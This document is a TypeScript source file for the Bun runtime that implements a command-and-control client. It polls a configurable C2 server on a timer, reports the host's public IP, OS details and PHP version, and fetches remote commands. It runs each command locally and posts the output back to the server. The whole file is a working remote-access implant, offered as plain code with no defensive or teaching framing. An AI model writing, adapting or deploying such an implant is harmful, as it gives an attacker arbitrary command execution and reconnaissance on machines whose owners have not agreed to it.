import { argv, spawnSync } from "bun";
import os from "os";
import type { CommandPayloadDTO } from "./types";
import chalk from "chalk";

// Get command line arguments
const C2 = argv[2] || "http://localhost:7789";
const INTERVAL = +argv[3] || 5000;

const API_BASE_URL = `${C2}/api/tools/seoul`;

function getSystemInfo() {
  return {
    php: getPhpVersion(),
    os: getOsVersion(),
    ip: getIpAddress(),
  };
}

function getIpAddress() {
  try {
    return spawnSync(["curl", "icanhazip.com"]).stdout.toString().trim();
  } catch (err: unknown) {
    console.error(err);
    return "Unknown";
  }
}

function getOsVersion() {
  try {
    return spawnSync(["uname", "-a"]).stdout.toString();
  } catch (err: unknown) {
    console.error(err);
    return "Unknown";
  }
}

function getPhpVersion() {
  try {
    return spawnSync(["php", "-v"]).stdout.toString().split("\n")[0];
  } catch (err: unknown) {
    console.error(err);
    return "Unknown";
  }
}

async function postInfo() {
  try {
    const systemInfo = getSystemInfo();

    await fetch(`${API_BASE_URL}/node-info`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(systemInfo),
    });
  } catch (err: unknown) {
    console.error(err);
  }
}

async function getAndRunRemoteCommand() {
  try {
    const response = await fetch(`${API_BASE_URL}/remote-command`);
    const payload = (await response.json()) as CommandPayloadDTO;
    const command = payload.command;
    if (command) {
      const commandArr = command.split(" "); // TODO: Add handling for when commands come with strings that are seperated by spaces
      const process = spawnSync(commandArr);
      const stdout = process.stdout.toString();
      const stderr = process.stderr.toString();
      console.log(chalk.greenBright(stdout ? stdout : stderr));
      console.log(chalk.yellowBright("ABOVE OUTPUT from command:", command));

      await fetch(`${API_BASE_URL}/remote-command`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          commandRan: command,
          output: stdout ? stdout : stderr,
          error: stderr ? "True" : "False",
        }),
      });
    }
  } catch (err: unknown) {
    console.error(err);
  }
}
function runClient() {
  console.log("Pinging server @", API_BASE_URL);
  let pingCount = 0;
  setInterval(async () => {
    console.log(chalk.yellowBright(`Ping ${++pingCount}`));
    await postInfo();
    await getAndRunRemoteCommand();
  }, INTERVAL);
}

runClient();
